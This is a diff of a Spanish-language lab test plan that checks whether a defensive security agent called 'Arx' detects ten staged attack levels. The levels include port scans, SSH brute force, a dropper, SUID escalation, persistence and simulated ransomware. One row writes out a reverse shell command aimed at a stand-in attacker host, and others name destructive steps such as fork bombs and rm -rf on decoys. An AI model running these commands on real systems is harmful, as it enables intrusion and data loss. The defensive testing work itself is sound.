@@ -46,15 +46,15 @@ laboratorio). Solo cuando A y B estén verdes.
 
 | Nivel | Ataque (procedimiento) | Comportamiento esperado de Arx | Pasa si… |
 |---|---|---|---|
-| **1 — Reconocimiento** | `nmap -sS -sV -p-` desde el atacante | Detectar el escaneo (sensor de red) y elevar vigilancia | **HOY: GAP conocido** — sin sensor SYN; queda documentado y agenda el sensor de red |
-| **2 — Fuerza bruta** | `hydra ssh://victima` con diccionario | Tormenta de fallos en auth.log → alerta + (futuro) tarpit | **Parcial hoy** — depende del colector de auth.log; si no hay hallazgo, es gap |
+| **1 — Reconocimiento** | `nmap -sS` desde el atacante | Pista kernel nft (`inet arx scan4/6`: cada SYN entrante, incluso a puertos cerrados) → ≥8 puertos/10 min → **Tier 1: bloqueo de IP** | Hallazgo `port_scan` + elemento en `block_ipv4` + atacante sin alcance (curl agota tiempo). Sin nftables degrada a procfs (solo puertos que aceptan) |
+| **2 — Fuerza bruta** | 8 intentos SSH fallidos reales (sshpass) | auth.log incremental → ≥6 fallos/10 min desde una IP → **Tier 1: bloqueo de IP** | Hallazgo `auth_bruteforce` + IP bloqueada |
 | **3 — Credencial débil** | Login SSH con usuario nuevo/credencial por defecto | `login_users` fuera de baseline → hallazgo high | Hallazgo nuevo registrado y alertado |
 | **4 — Explotación de servicio** | App web vulnerable plantada (RCE) → el atacante abre un listener nuevo (p. ej. 4444) | Puerto nuevo → Tier 1: bloqueo firewall REAL + registro | Regla de bloqueo visible (ufw/nft) y auto-expira |
 | **5 — Dropper** | Descargar "malware" a `/tmp`, `chmod +x`, ejecutarlo | Ejecutable nuevo en dir sospechoso (high) → **SIGSTOP** inmediato | Proceso en estado T; SIGCONT al expirar; reaparición → Tier 2 |
-| **6 — Reverse shell** | `bash -i >& /dev/tcp/atacante/4444` desde la víctima | Conexión saliente anómala + proceso hijo raro | **GAP parcial hoy** — necesita sensor de conexiones (Falco/ss); documentado |
+| **6 — Reverse shell** | `bash -i >& /dev/tcp/atacante/4444` desde la víctima | Conexión saliente anómala + proceso hijo raro | **GAP hoy** — el colector de conexiones ya existe (`recon.collect_connections`); falta la correlación con el ejecutable origen (Falco/`ss -p`) y el actuador `ss -K` |
 | **7 — Escalada** | Plantar binario SUID nuevo (`chmod u+s`) | Barrido SUID + integridad → **crit** | Hallazgo crit en el siguiente barrido SUID |
-| **8 — Persistencia** | Entrada en cron/systemd/`authorized_keys` | Integridad drift → **crit → Tier 2** (humano decide) | Pendiente Tier 2 creado; nada se revierte solo |
-| **9 — Anti-forense** | Truncar logs + leer ficheros sensibles (señuelos) | Canary: lectura detectada (alta, one-shot); truncado de log | Canary ✓; truncado: **gap parcial** (el cursor detecta rotación, no silencio) |
+| **8 — Persistencia** | Entrada en cron/systemd/`authorized_keys` | Integridad drift → **crit → Tier 2** (humano decide) → restauración desde vault + intruso en cuarentena | Pendiente autorizado → fichero hostil fuera de su sitio y preservado como evidencia |
+| **9 — Anti-forense** | Truncar logs + leer ficheros sensibles (señuelos) | Canary: lectura detectada (alta, one-shot); **truncado de auth.log → `log_tamper`** | Canary ✓ + hallazgo `log_tamper` (mismo inode, tamaño menor) |
 | **10 — Destrucción total** | Ransomware simulado (cifrado masivo en árbol señuelo) + fork bomb + `rm -rf` sobre señuelos; en VM | **El freno de seguridad salta**: Arx deja de actuar tras 5 acciones/hora, escala todo a humano, alerta crítica masiva | Breaker disparado + alertas emitidas + nada irreversible hecho por Arx; la VM puede morir — por eso es VM |
 
 **Criterio de nivel superado:** el comportamiento esperado ocurre Y queda evidencia en
@@ -66,10 +66,12 @@ honesto de lo que falta construir (y cada gap ya tiene fase en el roadmap).
 ## Ejecución
 
 ```bash
-lab/docker-lab.sh        # mini-lab: niveles 3,4,5,7,8,9 (los que hoy deben pasar)
+lab/docker-lab.sh        # mini-lab DOS contenedores: L1 y L2 reales (nmap/sshpass
+                         # desde el atacante) + L4,5,7,8,9 en la víctima + prueba de
+                         # contención (el atacante pierde alcance tras el bloqueo)
 lab/run-levels.sh N      # un nivel concreto dentro de la víctima
 ```
 
-El scoreboard imprime PASS/GAP por nivel. Los niveles 1, 2 y 6 requieren el atacante
-separado (red interna Docker o VM Kali) y/o sensores que aún no existen — se documentan
-como GAP hasta su fase.
+El scoreboard imprime PASS/FAIL por nivel. Los niveles 3 y 10 necesitan VM (L3 toca
+credenciales reales; L10 es destructivo — ver `lab/vm/`). El nivel 6 sigue en GAP
+honesto: falta la correlación conexión→proceso origen y el actuador `ss -K` (F5).
